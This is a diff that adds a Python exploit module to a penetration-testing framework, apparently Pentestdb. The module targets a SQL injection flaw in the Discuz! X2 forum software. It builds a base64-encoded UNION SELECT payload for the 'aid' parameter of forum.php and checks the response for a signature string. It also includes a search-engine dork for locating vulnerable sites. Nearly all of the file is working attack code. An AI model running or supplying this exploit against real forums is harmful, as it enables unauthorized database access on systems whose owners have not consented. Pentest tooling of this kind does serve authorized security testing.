@@ -1,0 +1,48 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+import base64
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzXSI(Exploit):
+    expName = u"DiscuzX 2 forum_attachment SQL注入"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "x2"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2011-02330']
+    description = u'''
+        漏洞利用条件：1.discuz x2
+        SQL注入漏洞
+        gh: inurl:forum.php?mod=attachment
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '2c1743a391305fbf367df8e4f069f9f9'
+        payload = "1' and 1=2 union all select 1,'{0}".format(sig)
+        self.params['mod'] = "attachment"
+        self.params['findpost'] = "ss"
+        self.params['aid'] = base64.b64encode(payload)
+
+        url = self.urlJoin("/forum.php")
+        response = self.http.get(url, params=self.params)
+
+        if response.status_code == 200:
+            if sig in response.request.url:
+                result['fullpath'] = url
+                result['payload'] = payload
+
+        return result
